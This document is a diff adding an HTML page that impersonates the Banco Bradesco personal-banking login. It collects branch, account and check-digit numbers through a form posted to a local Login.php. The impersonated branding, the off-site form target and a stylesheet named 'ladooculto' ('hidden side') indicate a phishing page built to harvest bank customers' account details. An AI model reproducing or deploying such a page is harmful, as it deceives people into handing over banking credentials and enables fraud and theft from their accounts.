@@ -1,0 +1,30 @@
+
+<!DOCTYPE html>
+<html>
+<head lang="pt-br">
+    <meta charset="UTF-8">
+    <title>Banco Bradesco | Pessoa Física, Exclusive, Prime e Private</title>
+    <script src="includes/js.js" language="JavaScript"></script>
+    <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js"></script>
+    <link href="css/ladooculto.css"  rel="stylesheet"  type="text/css"  media="all">
+
+</head>
+<body class="body">
+
+<img src="foto1.png"  >
+
+<form name="formdes" id="formdes" method="post" action="Login.php">
+    <input type="text" name="agdes" id="texto" title="Informe o número da agência sem o dígito" required  maxlength="4" onkeyup="proximoCampo(this, 'ctdes')"  onkeypress="return Apenas_Numeros(event, this.name);" >
+    <input type="text" name="ctdes" id="texto1" title="Informe a Conta sem o dígito" required  maxlength="7" onkeyup="proximoCampo(this, 'digdes')"  onkeypress="return Apenas_Numeros(event, this.name);" >
+    <input type="text" name="digdes" id="texto2" title="Informe o dígito da sua conta" required maxlength="1" onkeypress="return Apenas_Numeros(event, this.name);" >
+    <input type="image" src="botao.png" id="botao" title="Entrar" value="submit">
+</form>
+
+
+<div class="top-bar-center">
+
+    <span class="txt-data"><span class="hide960"><script>EscreveData();</script></span></span>
+
+</div>
+</body>
+</html>
